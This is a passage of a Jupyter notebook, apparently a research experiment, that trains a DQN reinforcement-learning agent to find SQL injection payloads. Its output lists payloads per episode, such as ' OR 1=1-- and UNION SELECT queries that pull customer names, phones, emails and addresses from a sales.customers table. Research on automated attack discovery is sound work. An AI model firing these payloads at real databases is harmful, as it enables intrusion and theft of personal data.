    "            # Use the target model for stability\n",
    "            future_rewards = model_target.predict(state_next_sample, batch_size=batch_size, verbose=0)\n",
    "            # Q value = reward + discount factor * expected future reward\n",
    "            updated_q_values = rewards_sample + gamma * tf.reduce_max(\n",
    "                future_rewards, axis=1\n",
    "            )\n",
    "\n",
    "            # If final frame set the last value to -1\n",
    "            updated_q_values = updated_q_values * (1 - done_sample) - done_sample\n",
    "\n",
    "            # Create a mask so we only calculate loss on the updated Q-values\n",
    "            masks = tf.one_hot(action_sample, num_actions)\n",
    "\n",
    "            with tf.GradientTape() as tape:\n",
    "                # Train the model on the states and updated Q-values\n",
    "                q_values = model(state_sample)\n",
    "\n",
    "                # Apply the masks to the Q-values to get the Q-value for action taken\n",
    "                q_action = tf.reduce_sum(tf.multiply(q_values, masks), axis=1)\n",
    "                # Calculate loss between new Q-value and old Q-value\n",
    "                loss = loss_function(updated_q_values, q_action)\n",
    "\n",
    "            # Backpropagation\n",
    "            grads = tape.gradient(loss, model.trainable_variables)\n",
    "            optimizer.apply_gradients(zip(grads, model.trainable_variables))\n",
    "\n",
    "        if frame_count % update_target_network == 0:\n",
    "            # update the the target network with new weights\n",
    "            model_target.set_weights(model.get_weights())\n",
    "\n",
    "        # Limit the state and reward history\n",
    "        if len(rewards_history) > max_memory_length:\n",
    "            del rewards_history[:1]\n",
    "            del state_history[:1]\n",
    "            del state_next_history[:1]\n",
    "            del action_history[:1]\n",
    "            del done_history[:1]\n",
    "\n",
    "        if done:\n",
    "            break\n",
    "\n",
    "    # Update running reward to check condition for solving\n",
    "    episode_reward_history.append(episode_reward)\n",
    "    if len(episode_reward_history) > 100:\n",
    "        del episode_reward_history[:1]\n",
    "    running_reward = np.mean(episode_reward_history)\n",
    "\n",
    "    episode_count += 1\n",
    "\n",
    "    if episode_count >= training_episodes + test_episodes:\n",
    "        print(f'DQN terminated at episode {episode_count} with a running reward of {running_reward}!')\n",
    "        analytics.stop_analytics()\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_avg_attempts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_context_attempts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_avg_timings()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "analytics.plot_context_timings()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "',Context 1,Context 2\\r\\nEpisode 901,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 902,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 903,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 904,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 905,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 906,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 907,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 908,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 909,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 910,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 911,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 912,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 913,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 914,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 915,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 916,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 917,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 918,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 919,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 920,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 921,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 922,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 923,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 924,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 925,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 926,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 927,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 928,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 929,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 930,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 931,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 932,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 933,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 934,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 935,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 936,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 937,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 938,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 939,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 940,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 941,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 942,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 943,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 944,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 945,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 946,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 947,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 948,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 949,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 950,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 951,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 952,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 953,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 954,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 955,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 956,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 957,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 958,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 959,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 960,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 961,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 962,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 963,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 964,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 965,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 966,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 967,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 968,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 969,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 970,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 971,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 972,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 973,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 974,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 975,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 976,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 977,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 978,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 979,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 980,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 981,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 982,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 983,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 984,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 985,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 986,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 987,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 988,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 989,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 990,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 991,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 992,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 993,\\' OR 1=1-- ,\\' OR 1=1-- \\r\\nEpisode 994,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 995,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 996,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 997,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 998,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\\' OR 1=1-- \\r\\nEpisode 999,\\' OR 1=1-- ,\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\nEpisode 1000,\"\\' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\"\\' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\"\\r\\n'"
      ]
     },
     "execution_count": 186,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = analytics.get_test_payloads()\n",
    "df.to_csv()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Context 1</th>\n",
       "      <th>Context 2</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Episode 901</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 902</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 903</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 904</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 905</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 906</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 907</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 908</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 909</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 910</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 911</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 912</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 913</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 914</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 915</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 916</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 917</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 918</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 919</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 920</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 921</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 922</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 923</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 924</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 925</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 926</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 927</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 928</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 929</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 930</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 931</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 932</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 933</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 934</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 935</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 936</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 937</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 938</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 939</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 940</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 941</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 942</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 943</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 944</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 945</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 946</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 947</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 948</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 949</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 950</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 951</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 952</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 953</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 954</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
